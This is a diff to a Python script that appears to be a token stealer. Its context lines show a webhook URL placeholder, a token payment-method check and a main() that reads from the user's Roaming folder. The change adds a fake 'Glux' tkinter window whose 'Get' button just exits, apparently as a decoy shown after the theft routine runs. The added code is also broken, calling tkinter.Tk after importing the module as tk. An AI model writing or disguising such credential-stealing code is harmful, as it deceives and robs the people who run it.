@@ -6,6 +6,7 @@ from base64 import b64decode
 from datetime import datetime
 from json import loads, dumps
 from urllib.request import Request, urlopen
+import tkinter as tk
 
 webhook_url = "YOUR_WEBHOOK_URL_HERE"
 
@@ -110,6 +111,8 @@ def has_payment_methods(token):
 	except:
 		pass
 
+def gete():
+	exit()
 def main():
 	global webhook_url
 	cache_path = ROAMING + "\\.cache~$"
@@ -206,6 +209,11 @@ def main():
 		pass
 try:
 	main()
+	win = tkinter.Tk(className="Glux")
+	win.iconbitmap(r"C:\Users\user\OneDrive\デスクトップ\gyazoapi\1230sysbeta\infinityico.ico")
+	win.geometry("1280x720")
+	win.title("Glux")
+	button = tk.Button(win, text="Get", width=100, command=gete)
+	button.grid()
 except Exception as e:
-	print(e)
 	pass
